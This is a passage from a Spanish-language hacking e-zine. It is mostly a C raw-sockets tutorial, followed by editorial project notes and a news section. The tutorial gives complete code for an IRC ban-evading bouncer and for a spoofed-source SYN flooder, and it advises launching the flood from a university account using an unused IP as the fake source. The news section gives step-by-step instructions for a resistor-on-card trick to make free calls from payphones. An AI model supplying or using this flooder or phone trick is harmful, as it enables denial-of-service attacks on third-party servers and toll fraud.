        printf("\n");
        }
*****************************************************************************

Para cerrar una conexion en un socket se usa la syscall close(). Creo que con
lo que sabes ya puedes empezar a programar tus propios programas y aprender
mas, que de eso se trata. Esto que has visto hasta ahora es muy simple, pero
es mejor que lo entiendas antes de pasar al siguiente apartado.


        2.5.- E/S NO-BLOQUEANTE (NON-blocking I/O)

Supon que quieres hacer un bouncer (por ejemplo). Para los que no sepan los
que es un bouncer dire que es un programa que escucha en un host que hace de
gateway entre tu y el host con el que quieres conectar. Te puede valer para,
por ejemplo, saltarte un ban en el IRC. Lo que hace un bouncer es crear un
socket y escuchar en un puerto que solo sabe el que ha puesto el bouncer.
Cuando otro socket conecta con el socket del bouncer, éste abre otra conexion
con otro host, que es el servidor de IRC :), y a continuacion todo lo que le
llega de un socket lo escribe por el otro y viceversa.

*********[ mi_makina gateway (con el bouncer) irc.arrakis.es ]***************

    socket <========> socket1 <= bouncer => socket2 <=========> socket

*****************************************************************************

Pero a la hora de hacer el bouncer te encuentras con un problema: para
escuchar datos de un socket usas recv(), pero recv() es bloqueante, lo que
quiere decir que si mientras esperas que lleguen datos de un socket, llegan
datos del otro, no podras recibirlos hasta que llegue algo del otro (joder,
que vueltas doi). Pues vaya mierda de bouncer. Ah, pero nosotros podemos usar
E/S no-bloqueante. Si marcas un socket como no-bloqueante la llamada a recv()
no se bloquea si no hay datos, sino que devuelve -1 y pone en la variable
errno el valor EWOULDBLOCK. Si la llamada usada es read(), errno vale EAGAIN.
Con esto ya puedes hacer el bouncer, pero, ¨como se marca un socket como
no-bloqueante? Asi:

        int fd = socket(AF_INET, SOCK_STREAM, 6);
        int flags;

        flags = fcntl(fd, F_GETFL);
        fcntl(fd , F_SETFL, flags | O_NONBLOCK);

Y ya esta. El socket se quedara marcado como no bloqueante. Esto hazlo
DESPUES de conectar. Aqui tienes un bouncer (muy cutre por supuesto ;)

**************************[ sockets/bouncer.c ]******************************

        #include <netinet/in.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <fcntl.h>
        #include <errno.h>

        void comunica(int, struct sockaddr_in *);

        void main(int argc, char **argv)
        {
        int fd, nfd, on = 1;
        struct sockaddr_in dir = { AF_INET, 0, INADDR_ANY };
        struct sockaddr_in serv = { AF_INET, 0 , 0};

        if (argc < 4) {
        printf(" Uso:\n");
        printf("\t%s <puerto> <server> <puerto_server> \n\n",argv[0]);
        exit(0);
        }

        if ((fd = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
        perror(" socket() ");
        exit(0);
        }

        setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

        dir.sin_port = htons(atoi(argv[1]));
        if (bind(fd, (struct sockaddr_in*) &dir, sizeof(dir)) != 0) {
        perror(" bind() ");
        exit(0);
        }

        serv.sin_addr.s_addr = inet_addr(argv[2]);
        serv.sin_port = htons(atoi(argv[3]));

        listen(fd, 5);
        if (fork()) exit(0);

        for (;;) {
        nfd = accept(fd, NULL, NULL);
        switch(fork()) {
        case 0:
        close(fd);
        comunica(nfd, &serv);
        exit(0);
        break;
        default:
        close(nfd);
        if (fork()) exit(0);
        break;
        }
        }
        }

        void comunica(int fd, struct sockaddr_in *dir)
        {
        int nfd = socket(AF_INET, SOCK_STREAM, 6);
        int fl;
        int leidos;
        char buffer[8192];

        if (nfd < 0) exit(0);

        if (connect(nfd, dir, sizeof(struct sockaddr_in)) < 0) exit(0);

        fl = fcntl(fd, F_GETFL);
        fcntl(fd, F_SETFL, fl | O_NONBLOCK);
        fl = fcntl(nfd, F_GETFL);
        fcntl(nfd, F_SETFL, fl | O_NONBLOCK);

        for (;;) {

        if ((leidos = read(nfd, buffer, 8192)) > 0)
        if (write(fd, buffer, leidos) < 0) exit(0);
        if (leidos == 0) exit(0);
        if (leidos == -1)
        if (errno != EAGAIN) exit(0);
        if ((leidos = read(fd, buffer, 8192)) > 0)
        if (write(nfd, buffer, leidos) < 0) exit(0);
        if (leidos == 0) exit(0);
        if (leidos == -1)
        if (errno != EAGAIN) exit(0);
        }
        }
*****************************************************************************


        3.- SOCKETS RAW

Los sockets STREAM utilizan el protocolo TCP para comunicarse entre si, pero
para el programador (o sea tú) esto es completamente transparente. Hay veces
que interesa acceder a los protocolos a un nivel mas bajo, para mandar
paquetes directamente. Evidentemente no interesa establecer una conexion TCP
completa paquete a paquete, pero para implementar un programa de synflood,
por ejemplo, es indispensable. Para hacerlo vas a usar sockets del tipo RAW.
Para crear un socket RAW se usa socket(), pero en el tipo hay que poner
SOCK_RAW y en el protocolo el numero del protocolo al que quieres mandar o
recibir paquetes. Por ejemplo, si creas un SOCK_RAW con protocolo 1 (icmp) y
empiezas a enviar datos aleatorios como un loco, veras que el tcpdump te
muestra paquetes ICMP erroneos o de tipo desconocido.


        3.1.- ICMP

Para mandar paquetes ICMP la cabecera ICMP se coloca a continuacion de la
cabecera IP en el paquete, y es justamente a partir de ahi donde se van
insertar los datos que mandemos a traves del socket. Para mandar datos a
traves del socket se usa la syscall sendto().

        int sendto(int sockfd, const void *msg, int len, unsigned int flags,
        const struct sockaddr *to, int tolen);

Para ilustrar los sockets RAW con prot. ICMP voy a poner un programa que
manda pings. Parece una gilipollez pero sirve para que entiendas como
funciona. Vale, los datos que mandas a traves del socket se colocan a
continuacion de la cabecera IP, asi que lo que tenemos que enviar son
cabeceras ICMP. La cabecera ICMP viene definida en netinet/ip_icmp.h
como:

        struct icmphdr
        {
        u_int8_t type; /* message type */
        u_int8_t code; /* type sub-code */
        u_int16_t checksum;
        union
        {
        struct
        {
        u_int16_t id;
        u_int16_t sequence;
        } echo; /* echo datagram */
        u_int32_t gateway; /* gateway address */
        struct
        {
        u_int16_t __unused;
        u_int16_t mtu;
        } frag; /* path mtu discovery */
        } un;
        };

El type y el code indican el tipo de paquete ICMP. Estos tambien vienen
definidos en netinet/ip_icmp.h:

        #define ICMP_ECHOREPLY 0 /* Echo Reply */
        #define ICMP_DEST_UNREACH 3 /* Destination Unreachable */
        #define ICMP_SOURCE_QUENCH 4 /* Source Quench */
        #define ICMP_REDIRECT 5 /* Redirect (change route) */
        #define ICMP_ECHO 8 /* Echo Request */
        #define ICMP_TIME_EXCEEDED 11 /* Time Exceeded */
        #define ICMP_PARAMETERPROB 12 /* Parameter Problem */
        #define ICMP_TIMESTAMP 13 /* Timestamp Request */
        #define ICMP_TIMESTAMPREPLY 14 /* Timestamp Reply */
        #define ICMP_INFO_REQUEST 15 /* Information Request */
        #define ICMP_INFO_REPLY 16 /* Information Reply */
        #define ICMP_ADDRESS 17 /* Address Mask Request */
        #define ICMP_ADDRESSREPLY 18 /* Address Mask Reply */
        #define NR_ICMP_TYPES 18

Si quereis saber mas sobre ICMP os remito al RFC 792. Queremos mandar
"pings". Mirando el RFC se deduce que el type es 8 y el code es 0. El
checksum se calcula sumando todas las palabras de 16 bits de la cabecera ICMP
y los datos en un acumulador de 32 bits. Despues se suman las palabras alta y
baja del acumulador y el not logico de los 16 primeros bits resultantes es el
checksum. Ademas, el type ICMP_ECHO usa los campos id y sequence de la
cabecera. Juntando todo esto ya podemos hacer el programa.

****************************[ sockets/miping.c ]*****************************
        #include <netinet/in.h>
        #include <netinet/ip_icmp.h>

        #include <fcntl.h>
        #include <stdlib.h>
        #include <stdio.h>

        u_int16_t ic_check(void *dataptr, int len)
        {
        u_int32_t acum = 0;
        u_int16_t ret,*ptr;
        int c;

        ptr = (u_int16_t*) dataptr;
        for (c = 0; c < len; c+=2) {
        acum += (*(ptr++));
        }

        ret = ~(((acum >> 16) + (acum & 0xFFFF)) & 0xFFFF);
        return ret;
        }

        void main(int argc, char **argv)
        {
        int fd = socket(AF_INET, SOCK_RAW, 1);
        struct icmphdr icmp;
        u_long daddr;
        struct sockaddr_in dir = {AF_INET, 0, 0 };
        u_char id, seq = 0;
        int fl;
        char buff[1024];
        struct iphdr *ip = (struct iphdr*) buff;
        struct icmphdr *rec = (struct icmphdr*) (buff + sizeof(struct iphdr));

        int len = sizeof(dir);

        if (argc < 2) {
        printf(" Uso:\n");
        printf("\t%s <ip>\n\n",argv[0]);
        exit(0);
        }

        daddr = inet_addr(argv[1]);
        dir.sin_addr.s_addr = daddr;

        id = time(NULL) % 255;

        printf(" \"Pingeando\" %s\n",argv[1]);

        fl = fcntl(fd, F_GETFL);
        fcntl(fd, F_SETFL, fl | O_NONBLOCK);

        for (;;) {

        bzero(&icmp, sizeof(icmp));

        icmp.type = 8;
        icmp.code = 0;
        icmp.un.echo.id = id;
        icmp.un.echo.sequence = seq++;

        icmp.checksum = ic_check(&icmp, sizeof(icmp));

        sendto(fd, &icmp, sizeof(icmp), 0, (struct sockaddr_in*) &dir,
        sizeof(dir));
        bzero(buff, 1024);
        while (recvfrom(fd, buff, 1024, 0, (struct sockaddr_in*) &dir, &len)
        > 0)
        if ((rec->type == 0) &&
        (rec->code == 0))
        printf(" ECHO_REPLY desde %s\n",inet_ntoa(ip->saddr));
        sleep(1);
        }
        }
*****************************************************************************

Fijaos en como se emplea recv() en sockets RAW. Lees los datos de todo el
paquete, no a partir de la cabecera ICMP. Es asi para todos los sockets RAW
(tcp, icmp, udp,...). Entonces, ¿que mas te da leer paquetes en un socket
icmp o tcp? Pues que en el primero solo podras leer los paquetes cuyo campo
protocol de la cabecera IP este a 1 (ICMP) y en el segundo cuando el campo
este a 6 (TCP). Facil :)


        3.2.- IP & TCP

Fale, ¨que pongo de ejemplo para el protocolo TCP, uno de los supervistos
port-scanners? Mejor un syn-flooder. Asi aprovecho y explico un poco el TCP
(pero de todos modos os recomiendo la lectura del RFC 793).

El TCP es confiable, es decir, puedes estar seguro que los datos llegan a su
destino, y ademas esta orientado a la conexion.  ¨Como se establece una
conexion TCP? Primero hay que ver un poco como son las tramas TCP.

******************************[ netinet/tcp.h ]******************************

        struct tcphdr
        {
        u_int16_t th_sport; /* source port */
        u_int16_t th_dport; /* destination port */
        tcp_seq th_seq; /* sequence number */
        tcp_seq th_ack; /* acknowledgement number */
        #if __BYTE_ORDER == __LITTLE_ENDIAN
        u_int8_t th_x2:4; /* (unused) */
        u_int8_t th_off:4; /* data offset */
        #endif
        #if __BYTE_ORDER == __BIG_ENDIAN
        u_int8_t th_off:4; /* data offset */
        u_int8_t th_x2:4; /* (unused) */
        #endif
        u_int8_t th_flags;
        #define TH_FIN 0x01
        #define TH_SYN 0x02
        #define TH_RST 0x04
        #define TH_PUSH 0x08
        #define TH_ACK 0x10
        #define TH_URG 0x20
        u_int16_t th_win; /* window */
        u_int16_t th_sum; /* checksum */
        u_int16_t th_urp; /* urgent pointer */
        };

*****************************************************************************

th_sport y dport indican los puertos fuente y destino respectivamente (en
bytes de red), th_seq y th_ack son los numeros de secuencia de los que se
habla tanto en el spoofing. th_off nos dice la longitud de la cabecera TCP en
palabras de 32 bits. Los flags validan ciertos campos de la cabecera, es
decir, si en los flags el bit ACK esta a 1, quiere decir que el campo th_ack
es "usable". El flags FIN indica al otro extremo que ya no vamos a mandar mas
datos. El SYN indica que queremos establecer una conexion. El RST termina una
conexion. El PUSH hace que el kernel pase todos los datos de la conexion tan
rapido como pueda a la aplicacion que lee en el socket. El ACK es el de
"confirmacion" de que "hemos recibido los datos" y usa el campo th_ack.
El URG valida el campo th_urp, pero no me sale de los cojones explicarlo.
Supon que el host A quiere establecer una conexion telnet con el host B.
Estos serian los paquetes enviados:

HOST fuente HOST destino FLAGS DATOS
* A B SYN 0
* B A SYN ACK 0
* A B ACK 0
A B ACK PSH 20 (por ejemplo)

Los paquetes del * son los del llamado "saludo de los tres pasos". Este es el
proceso por el cual se empieza una conexion. Si el host B no tuviese el
puerto 23 abierto, rechazaria la conexion, mandando un RST al host A.

HOST fuente HOST destino FLAGS DATOS
A B SYN 0
B A RST 0

Como lo de los numeros de secuencia no viene a cuento para lo del synflood os
lo mirais vosotros en cualquier documento sobre TCP. Volvamos a lo del
synflood. Cuando un socket hace un intento de conexion envia un paquete SYN,
y el socket pasa al estado SYN_SENT. Cuando el otro socket recibe el SYN,
envia el paquete SYN-ACK y pasa al estado SYN_RECV. Cuando el otro recibe el
ACK-SYN manda el ultimo ACK y pasa al estado ESTABLISHED, y empieza a mandar
datos. Hasta aqui bien. ¿Os acordais del parametro backlog de la llamada a
listen()? Especifica el numero de conexiones "a medias" que podia soportar el
socket. ¨Y cuales son las conexiones "a medias"? En las que el saludo de los
tres pasos no se ha completado. Entonces, ¨que pasa si un socket que escucha
en el puerto 80 tiene 128 intentos a la vez de
conexion? Que hasta que no se completara uno de ellos nadie se podria
conectar a ese puerto. Pero, y si los paquetes los mandas spoofeados y haces
que parezcan que provienen desde un host que esta apagado, o es inalcanzable?
Pues pasa que esas conexiones nunca se completaran, porque el host falseado
nunca va a enviar los paquetes ACK para completar las conexiones, ni tampoco
a resetearlas (que es lo que haria si estuviera encendido). Pasado un tiempo
(depende del S.O.) esas conexiones de borrarian y el puerto 80 seria
accesible de nuevo.

Tenemos casi todo para hacer el synflooder. Lo unico que nos falta es saber
como spoofear paquetes. Para eso tenemos los sockets RAW. El socket que
usaremos para el programa sera de este tipo: socket(AF_INET, SOCK_RAW,
255). ¨Por que 255?. El tercer parametro de la llamada a socket era el
protocolo,pero si lo llamas con protocolo 0 crea el socket con el protocolo
por defecto. Pruebalo con sockets STREAM, veras que da igual usar el 6 que el
0.

Pero los sockets RAW no tienen protocolo por defecto. Al usar el 255 usamos
el protocolo mas bajo que soporte el socket. En este caso el IP.
Recapitulemos. Tenemos todo, pero no sabemos como funciona el IP. Vamos a
ello. Las cabeceras estan en netinet/ip.h, el RFC es el 791.

        struct iphdr
        {
        #if __BYTE_ORDER == __LITTLE_ENDIAN
        u_int8_t ihl:4;
        u_int8_t version:4;
        #elif __BYTE_ORDER == __BIG_ENDIAN
        u_int8_t version:4;
        u_int8_t ihl:4;
        #else
        #error "Please fix <bytesex.h>"
        #endif
        u_int8_t tos;
        u_int16_t tot_len;
        u_int16_t id;
        u_int16_t frag_off;
        u_int8_t ttl;
        u_int8_t protocol;
        u_int16_t check;
        u_int32_t saddr;
        u_int32_t daddr;
        /*The options start here. */
        };

El campo IHL es analogo al th_off en el TCP. La version sera siempre 4 (de
momento). Tot_len es la longitud total de la trama. TTL es maximo numero de
host por los que puede pasar el paquete (se va decrementando cada vez que
pasa por alguno). El protocolo indica el idem de la cabecera que le sigue.
Las direcciones fuente y destino son saddr y daddr respectivamente. Bueno,
ahi va el codigo fuente:

************************[ sockets/synflooder.c ]*****************************

        #include <netinet/in.h>
        #include <netinet/ip.h>
        #include <netinet/tcp.h>
        #include <netdb.h>

        #include <stdio.h>
        #include <stdlib.h>

        struct psdhdr {
        u_int32_t saddr;
        u_int32_t daddr;
        char zero;
        char prot;
        u_int16_t len;
        };

        unsigned short tcheck( struct tcphdr *tcp, int len, unsigned long
        saddr,

        unsigned long daddr)
        {
        char buff[4096];
        unsigned short *ptr = (unsigned short*) buff;
        struct psdhdr *psd = (struct psdhdr*) buff;
        u_int32_t ret = 0,c;
        u_int16_t ret16;
        char *pad;

        bzero(buff,4096);
        memcpy(&buff[sizeof(struct psdhdr)],tcp,len);

        psd->saddr = saddr;
        psd->daddr = daddr;
        psd->zero = 0;
        psd->prot = 6;
        psd->len = htons(len);

        for (c = 0; c < (len + sizeof(struct psdhdr)); c+= 2)
        ret += (*(ptr++));

        if (c < (len + sizeof(struct psdhdr))) {
        ptr--;
        pad = (char*) ptr;
        pad++;
        ret += ((*pad) << 8);
        }
        ret = (ret >> 16) + (ret & 0xffff);
        return ~ret;
        }

        long resuelve(char *nom)
        {
        long re;
        struct hostent *nm;
        re = inet_addr(nom);
        nm = gethostbyname(nom);
        if (re == -1)
        {
        if (nm != NULL) {
        bcopy(nm->h_addr,(char *)&re,nm->h_length);
        return re;
        }
        printf("\n error: gethostbyname(): No existe ese nombre de
        host\n\n");
        exit(0);
        }
        return re;
        }

        void uso(char *ar)
        {
        printf(" Uso:\n");
        printf("\t%s <Host victima> <Puerto> <Host inalcanzable>
        <Numero>\n\n",ar);
        exit(0);
        }

        void main(int argc,char **argv)
        {
        int fd = socket(AF_INET,SOCK_RAW,255);
        struct sockaddr_in dir = {AF_INET, 0, 0};
        unsigned long sa,da;
        unsigned short sp,dp,n;
        char *paquete = (char*) malloc(50);
        struct iphdr *ip = (struct iphdr*) paquete;
        struct tcphdr *tcp = (struct tcphdr*) (paquete + sizeof(struct
        iphdr));

        if (argc < 5) uso(argv[0]);

        da = resuelve(argv[1]);
        dp = atoi(argv[2]);
        sa = resuelve(argv[3]);
        n = atoi(argv[4]);

        for (sp = 1; sp <= n; sp++) {
        bzero(paquete,50);

        ip->version = 4;
        ip->ihl = 5;
        ip->tos = 0;
        ip->ttl = 0xff;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->check = 0;
        ip->id = 1212;
        ip->frag_off = 0;
        ip->protocol = 6;
        ip->saddr = sa;
        ip->daddr = da;

        tcp->source = htons(sp);
        tcp->dest = htons(dp);
        tcp->seq = 0xff00ff00;
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = 0xffff;
        tcp->check = 0;
        tcp->check = tcheck(tcp,(sizeof(struct tcphdr)),sa,da);

        dir.sin_addr.s_addr = da;

        sendto(fd,paquete,(sizeof(struct iphdr)+sizeof(struct tcphdr)),0,
        (struct sockaddr_in*)&dir,sizeof(dir));
        }
        }
*****************************************************************************

Algunas cosas de los procolos me las he dejado en el teclado, como los
checksums. De eso deciros que el checksum de la trama IP lo calcula el kernel
solito, pero la del TCP lo tenemos que hacer nosotros. Para eso se usa una
pseudocabecera que tiene como campos la direccion ip fuente, destino, un byte
que es siempre cero, otro siempre 6 (TCP) y la longitud del paquete TCP mas
los datos. Este paquete se antepone a la cabecera TCP y se calcula
exactamente igual al ICMP.

NOTA PARA LAMERS: Seguro que algun scr1p_k1dd13 haga copy&paste con el
                  synfooder y el muy gilipollas se de cuenta que no funciona.
                  La mayoria de los ISP hacen filtrado de paquetes, asi que
                  luego no me maileeis quejandoos de vuestra estupidez.

El synflooder lo puedes usar desde alguna cuenta que tengas por ahi, por
ejemplo la de la uni. Si esta en una red ethernet en la que NO todas las IPs
hacen referencia a un host (como en la mayoria) puedes usarlo poniendo como
host inalcanzable alguna IP huerfana de esas. Si la IP de la makina donde
tienes la shell es 194.1.2.3, puedes poner la 194.1.2.200 (siempre que no
exista ningun host con esa IP).


        4.- FUNCIONES UTILES

A lo mejor mas de uno no sabe que es eso de bytes de red. Bueno, ¨sabeis como
se colocan en memoria los numeros en la plataforma x86? De forma que el byte
menos significativo se coloca en la posicion de memoria mas
baja. Asi el numero 0x00000001 en hexa colocado en memoria estaria asi
0x01000000. Esto se llama LITTLE_ENDIAN, o estar en bytes de host. Lo
contrario es BIG_ENDIAN o bytes de red. Los puertos y demas campos que
indiquen un numero en los paquetes se encuentran en bytes de red. Para pasar
un numero de 4 bytes de longitud de host a red se usa la funcion htonl, si el
numero es de 2 bytes se usa htons. Si el numero es de 1 byte de longitud no
hace falta hacerle nada burro!. Para hacer el cambio inverso se pueden usar
las funciones ntohl y ntohs, pero los mas avispados se habran dado cuenta que
hacen lo mismo, o sea que puedes usar una para hacer los dos cambios.

Para convertir una direccion del tipo "127.0.0.1" a una de 32 bits usada en
las cabeceras de los paquetes IP y en las estructuras sockaddr_in se usa la
funcion inet_addr. Para el cambio inverso se usa inet_ntoa.


        4.1.- RESOLVIENDO NOMBRES

Para resover nombres se usa la funcion gethostbyname(). Le pasas como
argumento el puntero al nombre y devuelve un puntero a una estructura
hostent.

        struct hostent {
        char *h_name; /* official name of host */
        char **h_aliases; /* alias list */
        int h_addrtype; /* host address type */
        int h_length; /* length of address */
        char **h_addr_list; /* list of addresses */
        }
        #define h_addr h_addr_list[0] /* for backward compatibility */

h_addr_list esta declarada como type char**, pero es un array de unsigned
longs con las IPs del host. Si lo que quieres es resolver un host a partir de
su IP la funcion que buscas es gethostbyaddr().


        5.- UNOS TIPS:

1.-Cuando quieras enviar en paquete a traves de un socket RAW, declara un
   buffer (un array de tipo char) y luego declaras las cabeceras IP y/o TCP
   como punteros dentro del buffer. Algo asi:

        char buffer[1024];
        struct iphdr *ip = (struct iphdr*) buffer;
        struct tcphdr *tcp = (struct tcphdr*) (buffer + sizeof(struct
        iphdr));

   Luego pones a cero todo el buffer con bzero() y rellenas las cabeceras, y
   los envias con sendto(fd, buffer, ...);

2.-El parametro struct sockaddr_in que hay que pasarle a sendto() SIEMPRE
   tiene que tener la direccion destino del paquete, y la familia de
   direcciones tiene que ser AF_INET

3.-Si vas a hacer un sniffer recuerda como vienen los datos en las tramas
   TCP: paquete IP, TCP y datos. OJO, las cabeceras no siempre ocupan lo
   mismo (porque pueden llevar opciones), pero para eso esta el campo IHL y
   doff. Para recibir una trama TCP en un socket RAW puedes hacerlo mas o
   menos asi:

        char buffer[1024];
        struct iphdr *ip = (struct iphdr*) buffer;
        struct tcphdr *tcp;
        char *datos;
        .
        .
        .
        recv(fd, buffer, 1024, 0);
        tcp = (struct tcphdr*) (buffer + sizeof(struct iphdr) + (ip->ihl * 4));

        datos = (char*) (tcp + (tcp->doff * 4));

4.-Mira las paginas man, estan para algo :)


                             /*--[ The End ]--*\

Comentarios, sugerencias y donativos :) a jdoing@bigfoot.com
Flames a /dev/null




ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º11.- Proyectos                º     El Futuro      º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]
Proyectos, proyectos y mas proyectos, jeje. En esta seccion mostramos los
objetivos que {7a69} tiene para un futuro, pero si los metemos aqui es para
que colaboreis :P

Aun que no puedo quejarme de las colaboraciones que hemos reibido en este
numero nunca esta de mas decirlo (para ver si aun llegan mas y dia a dia
nos convertimos en la publicacion mas leida xD).


1.-OTROS FORMATOS: No cabe duda que el formato txt es el mas estandarizado y
                   mas facil de leer (Pues basta con tener un simple
                   procesador de textos), pero tampoco cabe duda de que es
                   un formato algo incomodo, por lo que {7A69} se plantea la
                   posiblidad de hacer aparecer el E-Zine en formatos mas
                   vistosos como el HTML o HLP. Si alguien tiene interes en
                   pasar {7A69} a los formatos ya nombrados basta con que
                   mande un Mail a la direccion de correo oficial del
                   E-Zine comunicandolo.


2.-EL MALDITO PHREAK: Parece que en espa¤a los pheakers escasean, aun que
                      sabemos que no es asi... Unicamente un mail de el hijo
                      de un currate de telefonica ofreciendo ayuda, aun que
                      al parecer ese hijo ha cambiado de idea, por que no ha
                      respondido al mail que le mandamos....

                      Venga phreakers, animaros a escribir algun articulo,
                      solo son 100 pts al dia (uy, se me fue la olla :P).
                  

3.-NOTICIAS: La seccion noticias tratara de ser habitual en {7A69}, pero
             nosotros solos no podemos estar atentos a todo lo que pasa en
             el mundo del Undergr0und y de la seguridad informatica, asi que
             hacemos un llamamiento a todos aquellos que se sientan cada
             tarde en el sofa a ver la tele a que se animen a informarse de
             todo lo posible, a redactar noticia, y como no.... a
             enviarnoslas ;)


4.-IRCWAR: Bueno, el irc-war es un tema que no hemos tratado nada por ahora,
           si que para un futuro cercano trataremos de ofreceros un buen
           texto en el que se expliquen las tecnicas que utilizan los
           aficionados a este deporte (¨Deporte?).


5.- CONCURSOS: Como ya habreis podido leer hemos organizado un mini-concurso
               de dise¤o grafico, dependiendo de la partizipacion que haya
               en este primer concurso organizaremos algunos mas como:

                        -Imagenes ASCII
                        -Virus
                        -Relatos relacionados con el Undergr0und
                        -Miss Espa¤a 2000 (Ups! esto ya existe :P)


Dia a Dia.... ¨Lo que? xD





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º12.- Noticias / Curiosidades  º     Actualidad     º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Bueno, no hemos tenido demasiada colaboracion por parte del lector para esta
seccion, es una lastima, de todos modos la intentare llenar con algo de
contenido, espero que no deje de gustar:

-----------------{ El porque de la chapita y la MT }-------------------------
-----------------------------------------------------------------------------

En el numero anterior del E-Zine conmentabamos ligeramente un truco que
permite llamar gratis en las cabinas telefonicas (segun mi experiencia el
truco ya no funciona, pero he recibido algun mail diciendome que en algunos
sitios si que va), pues aqui, de la mano de JuStIcAr tenemos la explicacion
de este tinglado, ademas de una peque¤a apliacion, jejeje, aqui os dejo el
texto:

Hola, soy JuStIcAr, y esta es la primera vez q escribo para un e-zine, y lo
he hecho por peticion de Ripe. Lo que voy ha intentar explicar es por que la
cabina hace eso cuando metemos la chapita, y tambien hablare por encima de un
modelo mejorado de "chapa". Esto me lo comento un compa¤ero de mi clase,
aunque luego lo vi en un e-zine de Paradigma. Mi compa¤ero dice q funciona
(al menos aqui en malaga, pero en el e-zine de Paradigma decian que no. Si
quereis lo probais, pero aconsejo que lo probeis en un area poco transitada
(nada de probar con la chapita en unos grandes almacenes ni na de eso).

El truco de la chapita se basa en que cuando hacemos cortocircuito con la
chapa la cabina sigue activa, pero sin mandar datos a la centralita, con lo
que podremos acceder a modo de datos sin que nos pida identificacion, y
desde el podemos marcar lo que deseemos, incluidos prefijos de compa¤ias.

Con esto podremos hacer el truco de la chapita sin tener que quitar
la chapa nunca, ya que al tener una resistencia no sobrecargamos los
condensadores, y no tendremos que calcular el tiempo ya que cuando paremos
de oir a la persona que llamamos simplemente deberemos activar el microfono
(marcando dos numeros cuales quiera o "##")

INGREDIENTES:
-tarjeta
-Nos buscamos una resistencia de 1K que valen de 3 a 5 pesetas y que la
encontraremos en cualquier tienda de electronica
-Cabina telefonica (parece una tonteria, pero sin cabina no funciona
XDDDDDDDDDDDD)

MODO DE PREPARACION:
-Cojamos la tarjeta
-Le pegamos en la parte donde iria la chapa en la ranura de la cabina una
planchita de metal
-Le ponemos una patita de la resistencia tocando la plaquita de la tarjeta
(soldada queda mejor, pero pa los que no tengan con que q lo hagan con cinta
aislante, y la otra por fuera tocando al lector (la ranurita de la tarjetta
pero por la parte de fuera)

Espero que os haya quedado claro, y que el que no supiera el pq se aclare
con esto.

                   <Ripe: A mi me ha quedado claro :P>


-----------------------{ www.realmadrid.es hacked }--------------------------
-----------------------------------------------------------------------------

Pocos minutos despues de la conclusion del partido Deportivo - R.Madrid (en
el que el aquipo blanco perdio por 5 - 2, unos pirtas informaticos
modificaron la web del Real Madrid (http://www.realmadrid.es), desordenando
el logotipo de la pagina principal, metiendo el escudo del F.C. Barcelona, y
a¤adiendo un par de comentarios de los que se deduce que los hackers eran
merengues; "Esta pagina tardara mas en hacerse que la obra del escorial" y
"Esto no puede seguir asi, somos mas vulnerables en la red que la defensa
del equipo".

El periodico deportivo "El Mundo Deportivo" realizo diversa llamadas al
departamento de informatica del Real Madrid (Juer, que modernos), y se
sorprendieron al ohir a una chica decir "lo siento, pero no tenemos pagina
web" (¨¨¨¨????). Los del periodico, sorprendidos, llamaron unas cuantas veces
mas insistiendo (¨como se puede negar la evidencia?), y la chica llego a
cabrearse. jejeje, al final tuvieron que confesar y decir que la pagina web
fue hackeada atraves del mail (¨ya sabia de que hablaba?).

Estos actos pueden probocar una guerra cybernetica entre los equipos de
futbol, cosa que la verdad no estaria bien echo... Rivales solo sobre el
campo, es solo un deporte, nada mas :)


--------------------------{ Hackers en la tele }-----------------------------
-----------------------------------------------------------------------------

El dia 23 de Enero, la segunda de television espa¤ola (TV2) nos sorprendia en
el prorama de los domingos documentos TV con un repotaje llamado "Internet;
Zona peligrosa". En dicho documento se vieron tratados temas que no son muy
habituales en television, hack, virii, phreak, cyberpunk, etc.

En el repontaje pudimos ver a conocidos individuos de la scene espa¤ola, como
NetSavage, Underface, GriYo, MindTwist (hehehehe), entre otros. El programa
empieza con una peque¤a introduccion al hack mediante el diario virtual que
NetSavage escribio duranta la "male epoca" de HispaHack, y poco a poco se iba
andentrando en el tema. Se toco un poco el congreso de hackers celebrado en
Mallorca el a¤o pasado (la No Con Name) organizado por los miembros de
JJF / Hackers Team (ver seccion entrevista, ehehe). Pero no solo se hablo de
hack en el reportaje, el virii cobro su importancia (quizas demasido poco)
